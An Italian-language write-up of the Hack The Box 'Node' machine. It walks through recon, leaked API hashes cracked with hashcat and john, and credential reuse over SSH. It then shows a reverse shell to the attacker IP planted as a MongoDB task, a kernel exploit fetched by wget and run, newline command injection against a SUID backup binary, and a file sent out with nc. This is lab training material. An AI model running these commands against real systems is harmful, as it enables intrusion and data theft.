**Target: 10.10.10.58**


# INFORMATION GATHERING 

Per prima cosa lanciamo un rapido scan con [Nmap](../../Note/Tool/Nmap.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# nmap -sC -sV -O --min-rate=5000 10.10.10.58 -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-05 06:41 EDT
Nmap scan report for 10.10.10.58
Host is up (0.099s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
|_http-title: MyPlace
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
```

Un ulteriore scan su tutte le porte non ci da nessuna nuova informazione

Facciamo un piccolo recap 

- La versione di OpenSSH in esecuzione sulla porta 22 non è associata ad alcuna vulnerabilità critica, quindi è improbabile che otteniamo l'accesso iniziale attraverso questa porta, a meno che non troviamo le credenziali.
- Porta 3000 esegue un server Web, quindi eseguiremo le nostre tecniche di enumerazione standard su di esso.

# ENUMERATION

Visitamo http:10.10.10.58:3000

![](../zzz_rev/attachments/node.png)
abbiamo tre nomi di possibili utenti, teniamoli a menti potrebbero servici 

![](../zzz_rev/attachments/node1.png)

Abbiamo anche un prompt di login

Analizzando il codice sorgente troviamo collegamenti a una serie di script personalizzati. 

![](../zzz_rev/attachments/node3.png)

Gli script app.js e login.js non ci danno nulla di utile. D'altra parte, se visualizziamo /home.js, ottieni il seguente codice.

```
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

Visitando /api/users/latest  È presente un collegamento a un elenco di utenti. 

![](../zzz_rev/attachments/node2.png)

Otteniamo indietro i risultati di cui sopra dandoci quelli che sembrano essere nomi utente e password con hash. Come indicato con il flag "is-admin", nessuno di essi ha funzionalità di amministrazione

Allo stesso modo, lo script /admin.js contiene il codice seguente.

```
var controllers = angular.module('controllers');controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {  
  $scope.backup = function () {  
    $window.open('/api/admin/backup', '_self');  
  }$http.get('/api/session')  
    .then(function (res) {  
      if (res.data.authenticated) {  
        $scope.user = res.data.user;  
      }  
      else {  
        $location.path('/login');  
      }  
    });  
});
```

Fa riferimento al un /api/admin/backup m qauando visitiamo il ​​link /api/admin/backup, riceviamo un errore "autenticato: falso". 

![](../zzz_rev/attachments/node5.png)

Questo collegamento è limitato ma almeno sappiamo che l'account amministratore contiene un file di backup.

Lo script /profile.js contiene il codice seguente.

```
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});

```

Si fa riferimento ad un /api/users e quando visitiamo il ​​link /api/users/, otteniamo un elenco completo delle credenziali utente con hash, incluso l'account amministratore!

![](../zzz_rev/attachments/node6.png)

Ci salviamo l'hash e andiamo a forzarlo
lo forziamo tramite uno strumento [online](https://hashes.com/en/decrypt/hash) poiché è più veloce della mia macchina locale.

`dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester

ho provato anche con hashcat giusto per verifica ed dopo un po otteniamo lo stesso risultato.

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# hashcat hash.txt /usr/share/wordlists/rockyou.txt  -m 1400
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-4750HQ CPU @ 2.00GHz, 1766/3597 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07...34d0af
Time.Started.....: Wed Jul  5 07:17:24 2023 (1 sec)
Time.Estimated...: Wed Jul  5 07:17:25 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     9769 H/s (0.29ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 25%

Started: Wed Jul  5 07:16:25 2023
Stopped: Wed Jul  5 07:17:27 2023
```

Ci loggiamo  con le credenziali myP14ceAdm1nAcc0uNT:mancherster

![](../zzz_rev/attachments/node7.png)

Scarichiamo il  backup. Eseguiamo il seguente comando per determinare il tipo di file.

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# file myplace.backup
myplace.backup: ASCII text, with very long lines (65536), with no line terminators
```

Contiene testo ASCII. Osserviamo i primi caratteri del file.

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# head -c 100 myplace.backup
UEsDBAoAAAAAABqJEFUAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADFMH7YrRSpWR1eAsAAQQAAAAABAAAAABQ

```

Sembra una codifica base64. Proviamo a decodificare il file.

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# cat myplace.backup | base64 --decode > myplace-decoded.backup
```

Riguardiamo che tipo di file abbiamo adesso 

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# file myplace-decoded.backup
myplace-decoded.backup: Zip archive data, at least v1.0 to extract, compression method=store
```

È un file zip! Proviamo a decomprimerlo.È un file zip! Proviamo a decomprimerlo.

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# unzip myplace-decoded.backup
Archive:  myplace-decoded.backup
   creating: var/www/myplace/
[myplace-decoded.backup] var/www/myplace/package-lock.json password:

```

Ci chiede una password, proviamo a craccarlo con john, ma prima utiliziamo zip2john per prendere l'hash

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# zip2john myplace-decoded.backup 2>/dev/null | tee myplace.backup.zip.hash
myplace-decoded.backup:$pkzip$8*1*1*0*0*11*2938*4e1c457a7262267b82edc3ac6c114b4004*1*0*0*17*996a*6060cda902284b72de87b94c1e2e472c17928be76c2d2c*1*0*0*19*5083*22623796430db80bd4b1cf2c10a98b1edaeb98fd042b08cd45*1*0*0*1f*b16f*de0a2654754bed417a10637b1ba06bdeeb96c17209aaa3456f670cca38f278*1*0*0*24*a3cc*dad844872d30b7e02cb74b0219f1982dcd03c641c5c1939ae2396ba2bb89d74ecf116cc2*1*0*8*24*5083*e7aa2f139da623662c7189663b288c4bc41701d2a7e14a0d270f61ebdb0dd8f60dc9179d*1*0*0*24*9679*f648f6029e343df58d446a73b21bcba383b42b2131e54c7b5824d5d1fe0534bb53e605b3*2*0*11*5*118f1dfc*94cb*67*0*11*3d0f*3f7a2fc64b944895468c7a583060630844*$/pkzip$::myplace-decoded.backup:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/express/node_modules/qs/.eslintignore, var/www/myplace/node_modules/string_decoder/.npmignore, var/www/myplace/node_modules/isarray/.npmignore, var/www/myplace/node_modules/ipaddr.js/.npmignore, var/www/myplace/node_modules/cookie-signature/.npmignore, var/www/myplace/node_modules/isarray/.travis.yml, var/www/myplace/node_modules/debug/node.js:myplace-decoded.backup
```

Ora possiamo forzarlo con john 

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# john myplace.backup.zip.hash -w=/usr/share/wordlists/rockyou.txt --format=PKZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (myplace-decoded.backup)
1g 0:00:00:00 DONE (2023-07-06 01:48) 14.28g/s 2691Kp/s 2691Kc/s 2691KC/s sandriux..beckyg
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

I file vengono decompressi in quella che sembra la directory dell'applicazione myplace. Guardando in app.js, c'è una stringa di connessione al database con le credenziali per mark:

```bash
┌──(root㉿kali)-[/home/…/node/var/www/myplace]
└─# cat app.js

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

```

Abbiamo trovato un nome utente "mark" e una password "5AYRft73VtFpc84k" per connettersi a mongodb localmente. Ne prendiamo nota.



# GAINING AN INITIAL FOOTHOLD

La maggior parte degli utenti riutilizza le password, quindi usiamo la password che abbiamo trovato su SSH nell'account di Mark

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# ssh mark@10.10.10.58
The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.
mark@10.10.10.58's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

              .-.
        .-'``(|||)
     ,`\ \    `-`.                 88                         88
    /   \ '``-.   `                88                         88
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888'
        `-..-(   )
              `-`




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
mark@node:~$
```

Funziona !
Prediamo la flag users

```bash
mark@node:/home$ ls
frank  mark  tom
mark@node:/home$ cd tom
mark@node:/home/tom$ ls
user.txt
mark@node:/home/tom$ cat user.txt
cat: user.txt: Permission denied

```

Dobbiamo fare lateral moviment,

```bash
mark@node:/home/tom$ ps -aux

...<snip>..
tom 1253  0.0  6.1 1020892 46940 ?Ssl  06:32   0:03 /usr/bin/node/var/www/myplace/app.js
tom 1255  0.0  5.8 1008568 44520 ?Ssl  06:32   0:04 
/usr/bin/node/var/scheduler/app.js
...<snip>

```

Troviamo con 2 processi che girano come tom

- /var/www/myplace/app.js 
- /var/scheduler/app.js:

var/www/myplace/app.js  è la webapp con cui mi sono già interfacciato, quindi passerò a /var/scheduler/app.js:

```bash
mark@node:/var/scheduler$ cat app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

Questo script si collegherà al database Mongo e quindi eseguirà una serie di comandi ogni 30 secondi. Otterrà gli elementi dalla raccolta delle attività. Per ogni documento, passerà doc.cmd a exec per eseguirlo, quindi eliminerà il documento.

```bash
mark@node:/var/scheduler$ ls -la
total 28
drwxr-xr-x  3 root root 4096 Aug 16  2022 .
drwxr-xr-x 15 root root 4096 Aug 16  2022 ..
-rw-rw-r--  1 root root  910 Sep  3  2017 app.js
drwxr-xr-x 19 root root 4096 Aug 16  2022 node_modules
-rw-r--r--  1 root root 4709 Sep  3  2017 package-lock.json
-rw-rw-r--  1 root root  176 Sep  3  2017 package.json
```

Abbiamo solo i permessi per leggere il file, quindi non possiamo semplicemente includere una shell inversa. Visualizziamo il file, magari possiamo sfruttarlo in altro modo.

Come prima cosa ci colleghiamo a mongodb con le credenziali trovate prima
in questo caso scheduler è il nome del database

```bash
mark@node:/var/scheduler$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
>

```

In Mongo, un database (come lo scheduler) ha raccolte (una specie di tabelle simili in SQL). Questo db ha una raccolta:

```bash
> show collections
tasks
```

`show collections` mostra tutte le tabelle nel database è equivalente a 'show tables' in SQL

```bash
> db.task.find()
```

`db.tasks.find()` elenca il contenuto nella tabella delle attività - equivalente a 'select * from tasks' in SQL 

La raccolta delle task non contiene alcun documento. Non ci resta che aggiungerne uno che invia una shell inversa alla nostra macchina d'attacco.

```bash
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'"})
WriteResult({ "nInserted" : 1 })
```

`db.tasks.insert({......})` inserisce un task all'interno in questo caso abbiamo inserito un shell

Nella nostra macchina ci mettiamo in ascolto con nc sulla porta inserita nella shell

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# nc -lnvp 443
listening on [any] 443 ...
```

e dopo 30 secondi abbiamo la nostra shell come utente tom

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.58] 56880
bash: cannot set terminal process group (1255): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$
```

e finalmente possiamo prenderci la nostra user flag

```bash
tom@node:~$ cat user.txt
9f66542473e1b1023e412c34c32e68ab
```

# PRIVESC

## CVE-2017-16695

per prima cosa importiamo linux-exploit-suggester-2.pl

```bash
tom@node:~$ cd /tmp/
tom@node:/tmp$ wget http://10.10.14.9:8000/linux-exploit-suggester-2.pl
--2023-07-07 13:46:04--  http://10.10.14.9:8000/linux-exploit-suggester-2.pl
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24292 (24K) [text/x-perl]
Saving to: ‘linux-exploit-suggester-2.pl’

linux-exploit-sugge 100%[===================>]  23.72K  --.-KB/s    in 0.06s

2023-07-07 13:46:05 (391 KB/s) - ‘linux-exploit-suggester-2.pl’ saved [24292/24292]

tom@node:/tmp$ ls
LinEnum.sh
linux-exploit-suggester-2.pl
mongodb-27017.sock
root
root-decoded
systemd-private-23535b5ea8d74134a92ae4e95523326e-systemd-timesyncd.service-0Imbfe
vmware-root
```

Gli diamo i permessi ed eseguiamo

```
tom@node:/tmp$ chmod +x linux-exploit-suggester-2.pl
tom@node:/tmp$ ./linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 4.4.0
  Searching 72 exploits...

  Possible Exploits
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010

```


Ci da 3 possibili exploit, ci concentreremo sulla CVE-2017-16695

```
┌──(root㉿kali)-[~kali/htb/node]
└─# searchsploit -m 45010
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
    Codes: CVE-2017-16995
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/htb/node/45010.c
```

e la copiamo sulla macchina target tirando su un server python 

```bash
┌──(root㉿kali)-[~kali/htb/node]
└─# python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.58 - - [07/Jul/2023 08:50:56] "GET /45010.c HTTP/1.1" 200 -
```

 e scaricandola con wget

```bash
tom@node:/tmp$ wget http://10.10.14.9:8000/45010.c
--2023-07-07 13:51:03--  http://10.10.14.9:8000/45010.c
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13176 (13K) [text/x-csrc]
Saving to: ‘45010.c’

45010.c             100%[===================>]  12.87K  --.-KB/s    in 0.01s

2023-07-07 13:51:03 (1.05 MB/s) - ‘45010.c’ saved [13176/13176]

```

non ci resta che compilarlo  ed eseguirlo

```bash
tom@node:/tmp$ gcc -o 45010 45010.c
tom@node:/tmp$ ./45010
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88002563a100
[*] Leaking sock struct from ffff88002f0d7800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880027e70780
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880027e70780
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(tom),1002(admin)
cat /root/root.txt
69b89412f7c64bcc159b823ac782a0eb
```

## COMMAND INJECT

Questo metodo sfrutta una vulnerabilità di command injection che ci darà una shell con privilegi di root.

La lista  caratteri non permessi  è piuttosto ampia, ma ne mancava uno che funzionerà per comandare avere una command inject nel sistema. 

Una nuova riga nel sistema funzionerà proprio come in uno script Bash, interrompendo i comandi. Posso provare a inserire una nuova riga, quindi /bin/bash per vedere se funzionerà. Lo inserirò inserendo un `'`, quindi premendo invio per ottenere una nuova riga, quindi inserendo /bin/bash e aggiungendo una nuova linea ' e premendo invio:

```bash
tom@node:/tmp$ backup -q "" '
> /bin/bash
> '

zip error: Nothing to do! (/tmp/.backup_2040240105)
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@node:/tmp# id
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
root@node:/tmp#
```

# ROOT FLAG WHITOUT SHELL

Per prima cosa deviamo a quale gruppo apparitene l'utente tom

```bash
tom@node:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

Importiamo LinEnum, gli diamo i permessi di esecuzione e lo lanciamo 

```
tom@node:~$ pwd
/home/tom
tom@node:~$ cd /tmp/
tom@node:/tmp$ wget http://10.10.14.9:8000/LinEnum.sh
--2023-07-07 06:35:23--  http://10.10.14.9:8000/LinEnum.sh
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s

2023-07-07 06:35:23 (401 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

tom@node:/tmp$ ls
LinEnum.sh
mongodb-27017.sock
systemd-private-23535b5ea8d74134a92ae4e95523326e-systemd-timesyncd.service-0Imbfe
vmware-root
tom@node:/tmp$ chmod +x LinEnum.sh
tom@node:/tmp$ ./LinEnum.sh
```

Dall'output di LinEnum cerchiamo  eventuali informazioni/file associati all'ID di Tom o ai gruppi in cui si trova.
Dopo aver setacciato tutto l'output dello script, notiamo il seguente file che ha il bit SUID impostato.

```bash
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

Poiché il bit SUID è impostato per questo file, verrà eseguito con il livello di privilegio che corrisponde all'utente che possiede il file. In questo caso, il file è di proprietà di root, quindi il file verrà eseguito con i privilegi di root. Dal comando precedente che abbiamo eseguito, sappiamo che Tom è nel gruppo 1002 (admin) e quindi può leggere ed eseguire questo file.
Abbiamo visto questo file essere chiamato nello script app.js.

```bash
....  
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';  
....app.get('/api/admin/backup', function (req, res) {  
    if (req.session.user && req.session.user.is_admin) {  
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);  
      var backup = '';proc.on("exit", function(exitCode) {  
        res.header("Content-Type", "text/plain");  
        res.header("Content-Disposition", "attachment; filename=myplace.backup");  
        res.send(backup);  
      });proc.stdout.on("data", function(chunk) {  
        backup += chunk;  
      });proc.stdout.on("end", function() {  
      });  
    }  
    else {  
      res.send({  
        authenticated: false  
      });  
    }  
  });
```

Il file accetta tre argomenti:

1. La stringa '-q'
2. Una chiave di backup che viene passata all'inizio dello script
3. Un percorso di directory

Proviamo a eseguire il file con gli argomenti precedenti.

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
```

Otteniamo una stringa decodificata base64. Sulla base dell'output del programma, ho intenzione di uscire su un arto e dire che sta eseguendo il backup del percorso della directory che viene passato come argomento.
Per verificarlo, esegui nuovamente il comando e salvalo nel file test, quindi base64 decodifica quel file.

```bash
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > test
tom@node:/tmp$ cat test | base64 --decode > test-decodedtom@node:/tmp$ file test-decoded   
test-decoded: Zip archive data, at least v1.0 to extracttom@node:/tmp$ unzip test-decoded  
Archive:  test-decoded  
   creating: tmp/  
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/  
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/tmp/  
[test-decoded] tmp/test password:   
 extracting: tmp/test                  
   creating: tmp/.Test-unix/  
  inflating: tmp/LinEnum.sh            
   creating: tmp/.XIM-unix/  
   creating: tmp/vmware-root/  
   creating: tmp/.X11-unix/  
   creating: tmp/.ICE-unix/  
   creating: tmp/.font-unix/  
  inflating: tmp/pspy64
```

Quando decomprimiamo il file, usiamo la stessa password che abbiamo decifrato in precedenza (magicword).

Bene, passiamo il percorso del file root.txt come argomento al programma di backup.

```bash
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > root
tom@node:/tmp$ cat root | base64 --decode > root-decoded

root@kali:~/Desktop/htb/node# file root-decoded  
root-decoded: Zip archive data, at least v?[0x333] to extract
root@kali:~/Desktop/htb/node# 7z x root-decoded
```

Quando ho usato unzip sul file zip root, continuavo a ricevere un messaggio d'errore. Quindi ho dovuto trasferire il file sulla mia macchina di attacco e utilizzare invece 7z

>NOTA: per risolvere l'errore bastava creare un cartella con un nome differente da root nel mio caso l'ho chiamata unzip_root e ho detto ad unzip di estrarre l'archivio li 

```bash
tom@node:/tmp$ unzip root-decoded -d /tmp/unzip_root/
Archive:  root-decoded
[root-decoded] root/root.txt password:
 extracting: /tmp/unzip_root/root/root.txt
tom@node:/tmp$ ls
45010
45010.c
LinEnum.sh
linux-exploit-suggester-2.pl
mongodb-27017.sock
root
root-decoded
systemd-private-23535b5ea8d74134a92ae4e95523326e-systemd-timesyncd.service-0Imbfe
test
unzip_root
vmware-root
tom@node:/tmp$ cd unzip_root/
tom@node:/tmp/unzip_root$ ls
root
tom@node:/tmp/unzip_root$ cd root/
tom@node:/tmp/unzip_root/root$ ls
root.txt
tom@node:/tmp/unzip_root/root$ cat root.txt
```

Ecco il contenuto della flag root

![](../zzz_rev/attachments/node8.png)

Abbiamo la troll face.

## BYPASS TROLL FACE 
### 1st METOD WILDCARD

Qualcosa nel file di backup ci impedisce intenzionalmente di ottenere il flag root. Eseguiamo il programma ltrace per vedere quali comandi di sistema vengono chiamati quando eseguiamo il programma di backup.

```bash
ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /../../etc > test
```

ci da il seguente risultato 

```bash
strstr("/tmp", "..") = nil  
strstr("/tmp", "/root") = nil  
strchr("/tmp", ';') = nil  
strchr("/tmp", '&') = nil  
strchr("/tmp", '`') = nil  
strchr("/tmp", '$') = nil  
strchr("/tmp", '|') = nil  
strstr("/tmp", "//") = nil  
strcmp("/tmp", "/") = 1  
strstr("/tmp", "/etc") = nil  
strcpy(0xff98a1ab, "/tmp") = 0xff98a1ab
```

Come si può vedere, il programma sta filtrando la stringa del percorso della directory. Se includiamo una qualsiasi delle stringhe racchiuse nella funzione strchr o strstr come percorso di directory, ci ritroveremo con una troll face. Allo stesso modo, se il percorso della directory è un singolo "/", otteniamo anche una troll face . Quindi siamo autorizzati a utilizzare una barra rovesciata purché sia ​​inclusa come una stringa con altri caratteri.

```bash
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root
tom@node:/tmp$ cat root | base64 --decode > root-decoded
```

Come detto più su in nella  nota è possibile decomprimere l'archivio direttamente sulla macchina, creando una cartella con un nome differente da root nel mio caso l'ho chiamata unzip_root e ho detto ad unzip di estrarre l'archivio li.


oppure lo scarichiamo sulla nostra macchina per aprile l'archivio come prima con 7z

Ci mettiamo in ascolto con nc

```bash
┌──(root㉿kali)-[~kali/htb/node]
└─# nc -lvp 1234 > root-decoded
listening on [any] 1234 ...
```

e dal server remoto eseguiamo

```
tom@node:/tmp$ nc 10.10.14.9 1234 < root-decoded
```


```bash
┌──(root㉿kali)-[~kali/htb/node]
└─# nc -lvp 1234 > root-decoded
listening on [any] 1234 ...
10.10.10.58: inverse host lookup failed: Unknown host
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.58] 53870

┌──(root㉿kali)-[~kali/htb/node]
└─# 7z x root-decoded

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-4750HQ CPU @ 2.00GHz (40661),ASM,AES-NI)

Scanning the drive for archives:
1 file, 237 bytes (1 KiB)

Extracting archive: root-decoded
--
Path = root-decoded
Type = zip
Physical Size = 237


Enter password (will not be echoed):
Everything is Ok

Size:       33
Compressed: 237
┌──(root㉿kali)-[~kali/htb/node]
└─# ls
